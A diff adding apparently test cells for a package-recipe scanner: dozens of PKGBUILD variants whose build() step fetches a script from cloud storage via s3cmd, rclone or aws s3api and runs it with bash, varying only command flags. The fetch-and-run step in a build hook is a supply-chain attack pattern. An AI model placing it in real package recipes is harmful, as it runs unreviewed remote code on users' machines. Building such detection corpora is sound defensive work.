@@ -1,0 +1,595 @@
+cells:
+- id: D-s3cmd-get--q
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  s3cmd -q get s3://b/s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-s3cmd-get--v
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  s3cmd -v get s3://b/s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-s3cmd-get--d
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  s3cmd -d get s3://b/s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-s3cmd-get---debug
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  s3cmd --debug get s3://b/s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-s3cmd-get---no-progress
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  s3cmd --no-progress get s3://b/s.sh s.sh\n  bash s.sh\n  cd \"\
+    $srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make DESTDIR=\"$pkgdir\" install\n}\n"
+- id: D-s3cmd-get---progress
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  s3cmd --progress get s3://b/s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-s3cmd-get---configsc
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  s3cmd --config=sc get s3://b/s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-s3cmd-get--c_sc
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  s3cmd -c sc get s3://b/s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-s3cmd-get---regionus
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  s3cmd --region=us get s3://b/s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-s3cmd-get---hostx
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  s3cmd --host=x get s3://b/s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-s3cmd-get---access_keyk
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  s3cmd --access_key=k get s3://b/s.sh s.sh\n  bash s.sh\n  cd \"\
+    $srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make DESTDIR=\"$pkgdir\" install\n}\n"
+- id: D-s3cmd-get---secret_keys
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  s3cmd --secret_key=s get s3://b/s.sh s.sh\n  bash s.sh\n  cd \"\
+    $srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make DESTDIR=\"$pkgdir\" install\n}\n"
+- id: D-s3cmd-get---signature-v2
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  s3cmd --signature-v2 get s3://b/s.sh s.sh\n  bash s.sh\n  cd \"\
+    $srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make DESTDIR=\"$pkgdir\" install\n}\n"
+- id: D-s3cmd-get---dry-run
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  s3cmd --dry-run get s3://b/s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-s3cmd-sync---configsc
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  s3cmd --config=sc sync s3://b s\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-s3cmd-sync--c_sc
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  s3cmd -c sc sync s3://b s\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-s3cmd-sync--q
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  s3cmd -q sync s3://b s\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-s3cmd-sync---debug
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  s3cmd --debug sync s3://b s\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-rclone-copy--v
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  rclone -v copy r:s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-rclone-copy--vv
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  rclone -vv copy r:s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-rclone-copy---progress
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  rclone --progress copy r:s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-rclone-copy---stats1s
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  rclone --stats=1s copy r:s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-rclone-copy---transfers4
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  rclone --transfers=4 copy r:s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-rclone-copy---checkers8
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  rclone --checkers=8 copy r:s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-rclone-copy---log-levelDEBUG
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  rclone --log-level=DEBUG copy r:s.sh s.sh\n  bash s.sh\n  cd \"\
+    $srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make DESTDIR=\"$pkgdir\" install\n}\n"
+- id: D-rclone-copy---log-filetmpx
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  rclone --log-file=/tmp/x copy r:s.sh s.sh\n  bash s.sh\n  cd \"\
+    $srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make DESTDIR=\"$pkgdir\" install\n}\n"
+- id: D-rclone-copy---contimeout5s
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  rclone --contimeout=5s copy r:s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-rclone-copy---timeout10s
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  rclone --timeout=10s copy r:s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-rclone-copy---bwlimit1M
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  rclone --bwlimit=1M copy r:s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-rclone-copy---configx
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  rclone --config=x copy r:s.sh s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-rclone-cat--v
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  rclone -v cat r:s.sh > s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-rclone-cat---configx
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  rclone --config=x cat r:s.sh > s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\
+    \n  make\n}\n\npackage() {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"\
+    $pkgdir\" install\n}\n"
+- id: D-aws-s3api-obj-endpointurlhttpx
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  aws s3api --endpoint-url=http://x get-object --bucket b --key s.sh\
+    \ s.sh\n  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage()\
+    \ {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"$pkgdir\" install\n\
+    }\n"
+- id: D-aws-s3api-obj-regionus
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  aws s3api --region=us get-object --bucket b --key s.sh s.sh\n \
+    \ bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage() {\n\
+    \  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"$pkgdir\" install\n\
+    }\n"
+- id: D-aws-s3api-obj-profilep
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  aws s3api --profile=p get-object --bucket b --key s.sh s.sh\n \
+    \ bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage() {\n\
+    \  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"$pkgdir\" install\n\
+    }\n"
+- id: D-aws-s3api-obj-noverifyssl
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  aws s3api --no-verify-ssl get-object --bucket b --key s.sh s.sh\n\
+    \  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage()\
+    \ {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"$pkgdir\" install\n\
+    }\n"
+- id: D-aws-s3api-obj-outputjson
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  aws s3api --output=json get-object --bucket b --key s.sh s.sh\n\
+    \  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage()\
+    \ {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"$pkgdir\" install\n\
+    }\n"
+- id: D-aws-s3api-obj-debug
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  aws s3api --debug get-object --bucket b --key s.sh s.sh\n  bash\
+    \ s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage() {\n  cd\
+    \ \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"$pkgdir\" install\n}\n"
+- id: D-aws-s3api-obj-nosignrequest
+  text: "# Baseline recipe: recipe-mode inputs are diffed against this.\npkgname=harness-baseline\n\
+    pkgver=1.0.0\npkgrel=1\npkgdesc=\"Baseline package for harness campaigns\"\narch=('any')\n\
+    url=\"https://github.com/example/harness-baseline\"\nlicense=('MIT')\nsource=(\"\
+    https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz\")\nsha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n\
+    \nbuild() {\n  aws s3api --no-sign-request get-object --bucket b --key s.sh s.sh\n\
+    \  bash s.sh\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make\n}\n\npackage()\
+    \ {\n  cd \"$srcdir/harness-baseline-1.0.0\"\n  make DESTDIR=\"$pkgdir\" install\n\
+    }\n"
